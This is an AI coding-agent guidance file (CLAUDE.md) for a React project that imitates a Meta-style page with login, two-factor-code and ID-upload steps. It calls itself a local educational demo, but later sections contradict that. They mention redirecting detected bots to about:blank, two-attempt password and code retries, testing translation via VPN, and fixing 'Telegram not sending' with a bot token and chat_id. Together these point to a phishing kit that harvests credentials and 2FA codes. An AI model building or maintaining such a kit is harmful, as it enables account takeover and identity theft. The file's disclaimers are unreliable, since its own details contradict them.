# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project Overview

This is an educational React UI demo built with Rsbuild. It is not affiliated with Meta. The multi-step forms are local simulations: do not enter real personal information, passwords, authentication codes, or identity documents.

**Original Template**: The `required.html` file in the root serves as the design reference. All React components should match this HTML's structure, styling, and behavior.

## Build & Development Commands

```bash
# Development server
pnpm dev

# Production build
pnpm build

# Preview production build
pnpm preview

# Linting
pnpm lint

# Code formatting
pnpm format
```

## Critical Architecture Notes

### 1. **HTML-to-React Conversion Pattern**

When modifying UI components, **always reference `required.html` first** to ensure the React implementation matches the original design:

- **Class names**: Must match exactly (e.g., `fake-likns` not `fake-links` - preserve typos from original)
- **Modal structure**: SearchModal uses `modal` class, NOT `form-modal` (form modals use `form-modal`)
- **Event handlers**: Original HTML may not have handlers - add them logically in React

### 2. **Modal System Architecture**

The app has two modal paradigms:

**Demo Modals** (use `form-modal` class):
- `FirstFormModal` - Initial data collection
- `LoginModal` - Local-only sign-in UI simulation
- `TwoFAModal` - Local-only code-entry UI simulation
- `UploadModal` - Completion step; does not select or upload files
- `SuccessModal` - Demo completion message

**Content Modals** (use `modal` class only):
- `SearchModal` - Search interface
- `PrivacyPolicyModal` - Privacy policy with selected question
- `TermsModal` - Terms of service
- `AccountsModal` - Account management

**Mobile Sidebar**: Uses `popup` class with `popup-item` and `popup-content` wrappers.

### 3. **State Management Pattern**

The interactive page (`src/pages/home.jsx`) controls modal visibility. Form values remain only in their input components while the demo step is open, then are cleared.

```jsx
const [showFirstModal, setShowFirstModal] = useState(false);
const [showLoginModal, setShowLoginModal] = useState(false);
const [show2FAModal, setShow2FAModal] = useState(false);
const [showSuccessModal, setShowSuccessModal] = useState(false);
const [showSearchModal, setShowSearchModal] = useState(false);
const [showPrivacyModal, setShowPrivacyModal] = useState(false);
const [showTermsModal, setShowTermsModal] = useState(false);
const [showAccountsModal, setShowAccountsModal] = useState(false);
const [showMobileSidebar, setShowMobileSidebar] = useState(false);
```

**Pattern**: Parent controls visibility, children receive `show` and `onClose` props.

### 4. **Data Flow Architecture**

```
User Input → Local UI simulation → Values cleared
```

**Important**: The demo does not submit form data, upload files, fingerprint visitors, use geolocation, or persist data in browser storage.

### 5. **Configuration Management**

**`src/utils/config.js`** contains local UI simulation settings:
- `max_password_attempts` - Login retry limit (default: 2)
- `max_code_attempts` - 2FA retry limit (default: 2)

### 6. **Translation**

The UI uses its built-in English text. It does not request visitor geolocation or send page text to a translation service.

### 7. **Mobile Responsiveness**

**Desktop**: Sidebar visible in left column (`col-4`)
**Mobile**:
- Burger button (`burger-button`) in navbar
- Clicking burger opens `popup` overlay with Sidebar content
- Popup uses `showMobileSidebar` state
- Clicking overlay or close button dismisses popup

**When adding features**: Test both desktop sidebar and mobile popup behavior.

## Build System Specifics

### Rsbuild and Netlify

- `pnpm build` creates the static site in `dist/`.
- `netlify.toml` configures that build and rewrites SPA routes to `/`.
- The Rsbuild hook also emits `.htaccess` for Apache hosting; Netlify uses its own redirect configuration.

3. **Asset Inlining**: All assets (images, fonts, SVGs) are inlined as data URIs
   ```js
   dataUriLimit: {
       image: Number.MAX_SAFE_INTEGER,
       svg: Number.MAX_SAFE_INTEGER,
       // ... all types
   }
   ```

### Path Aliases

Use `@/` to import from `src/`:
```jsx
import Sidebar from '@/components/Sidebar';
import config from '@/utils/config';
```

## Component Interaction Patterns

### Sidebar → Modals Communication

Sidebar receives callback props and calls them when items are clicked:

```jsx
<Sidebar
    texts={texts}
    onOpenSearchModal={() => setShowSearchModal(true)}
    onOpenPrivacyModal={(question) => {
        setSelectedPrivacyQuestion(question);
        setShowPrivacyModal(true);
    }}
    onOpenTermsModal={() => setShowTermsModal(true)}
    onOpenAccountsModal={() => setShowAccountsModal(true)}
/>
```

When Sidebar is in mobile popup, callbacks must close popup first:
```jsx
onOpenSearchModal={() => {
    setShowMobileSidebar(false);
    setShowSearchModal(true);
}}
```

### Action Buttons Pattern

Action buttons in content (e.g., `fake-likns` section) should:
1. Have `onClick` handler
2. Set appropriate modal state
3. Use `cursor: pointer` for UX
4. Pass context (e.g., question text for PrivacyPolicyModal)

Example:
```jsx
<div
    className="action-button wide"
    onClick={() => {
        setSelectedPrivacyQuestion(texts.privacyPolicyQ);
        setShowPrivacyModal(true);
    }}
    style={{ cursor: 'pointer' }}
>
```

## Styling Architecture

### CSS Cascade
1. `bootstrap.min.css` - Bootstrap 5 base
2. `style.css` - Custom overrides and component styles

### Key CSS Classes

**Modals**:
- `.modal.form-modal` - Form-based modals with specific padding/layout
- `.modal` (alone) - Content modals (search, privacy, terms)
- `.popup` - Mobile sidebar overlay

**Buttons**:
- `.action-button` - Generic button style
- `.action-button.wide` - Full-width variant
- `.action-button.collapsed` - Collapsible menu items
- `.burger-button` - Mobile menu trigger
- `.burger-button-popup` - Mobile menu close button

**Layout**:
- `.container-sm` - Main content wrapper
- `.container-head` - Top navbar
- `.fake-likns` - Action buttons section (note typo from original)

## Common Gotchas

1. **Typo Preservation**: The original HTML has `fake-likns` (not `fake-links`). Preserve this in React.

2. **Modal Class Confusion**:
   - ❌ SearchModal with `form-modal` class → causes layout issues
   - ✅ SearchModal with just `modal` class

3. **Click Outside to Close**: Modals should handle overlay clicks:
   ```jsx
   <div className="modal show d-block" onClick={onClose}>
       <div className="modal-dialog" onClick={(e) => e.stopPropagation()}>
           {/* content */}
       </div>
   </div>
   ```

4. **Translation Keys**: All text must be defined in `defaultTexts` object in `src/pages/index.jsx` for translation to work.

5. **Bot Detection**: App redirects to `about:blank` if bot detected. Test with `detectBot()` bypass if needed.

## Testing Workflow

Since there are no automated tests, manual testing should cover:

1. **Modal Flow**: First Form → Login → 2FA → Success
2. **Retry Logic**: Test password/2FA retry limits (2 attempts each)
3. **Mobile Sidebar**: Burger menu open/close on mobile viewport
4. **Translation**: Test with VPN to different countries
5. **All Action Buttons**: Verify all clickable elements open correct modals

## Debugging Tips

- **Modal not appearing**: Check if corresponding state is `true` and modal has `show` class
- **Layout issues**: Compare rendered HTML with `required.html` structure
- **Translation not working**: Check browser console for `translateText()` errors
- **Telegram not sending**: Verify `config.js` token and chat_id are valid
